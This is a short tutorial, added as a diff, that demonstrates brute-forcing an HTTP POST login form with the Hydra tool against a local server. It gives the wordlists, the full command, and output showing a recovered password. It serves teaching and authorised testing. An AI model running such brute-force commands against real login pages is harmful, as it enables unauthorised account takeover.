@@ -1,0 +1,44 @@
+# Hydra Usage Example
+
+This is a demonstration of using the `Hydra` tool for brute-forcing login credentials via HTTP POST requests. The example uses a local host server (127.0.0.1) with sample username and password files.
+
+## File Contents
+
+**`passwords.txt`**:
+```plaintext
+password1
+password2
+```
+
+**`usernamesshortlist.txt`**:
+```plaintext
+user1
+```
+
+## Command Execution
+
+Run the following `hydra` command to perform the brute force attack:
+```bash
+sudo hydra -L usernamesshortlist.txt -P passwords.txt -u -f 127.0.0.1 -s 5500 http-post-form "/loginpage.html:username=^USER^&password=^PASS^:F=<div class='login-container'"
+```
+
+### Output
+The command produces the following output:
+```plaintext
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-13 05:10:34
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking http-post-form://127.0.0.1:5500/loginpage.html:username=^USER^&password=^PASS^:F=<div class='login-container'
+[5500][http-post-form] host: 127.0.0.1   login: user1   password: password1
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-13 05:10:34
+```
+
+## Notes
+- Ensure you have proper permissions to test on the target server.
+- Modify the login form parameters (`username`, `password`, and failure string `F`) to match the structure of your target application.
+
+## Disclaimer
+This demonstration is for educational purposes only. Unauthorized use of this tool on systems you do not own or have explicit permission to test is illegal.
